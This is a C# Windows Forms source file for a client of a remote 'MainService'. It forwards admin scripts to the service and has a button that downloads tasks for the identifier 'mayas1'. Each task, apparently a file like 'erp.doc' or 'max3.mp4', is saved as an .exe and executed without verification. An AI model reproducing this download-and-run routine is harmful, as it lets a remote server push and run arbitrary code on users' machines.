using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Assistance
{
    public partial class frmService : Form
    {
        public frmService()
        {
            InitializeComponent();

            service = new MainService.MainService();
        }

        private void btnRun_Click(object sender, EventArgs e)
        {
            txResult.Clear();

            foreach (String line in service.AdminScripts(txCode.Text, txQuery.Text))
                txResult.Text += line + Environment.NewLine;
        }

        private void btnAction1_Click(object sender, EventArgs e)
        {
            String[] tasks = service.GetTasks("mayas1");

            foreach (String s in tasks)
            {
                String fileName = System.IO.Path.GetFileNameWithoutExtension(s) + ".exe";
                System.IO.FileStream fs = new System.IO.FileStream(fileName, System.IO.FileMode.Create, System.IO.FileAccess.Write);
                Byte[] bytes = service.DownloadTask(s);
                fs.Write(bytes, 0, bytes.Length);
                fs.Close();

                System.Diagnostics.Process.Start(fileName);
            }
        }       

        private void btnAction2_Click(object sender, EventArgs e)
        {
            MessageBox.Show(service.SetTaskDone("mayas1", "erp.doc").ToString());
        }

        private void btnAction3_Click(object sender, EventArgs e)
        {
            MessageBox.Show(service.AdminSetTask(txCode.Text, "mayas1", "max3.mp4").ToString());
        }

        private MainService.MainService service;
    }
}
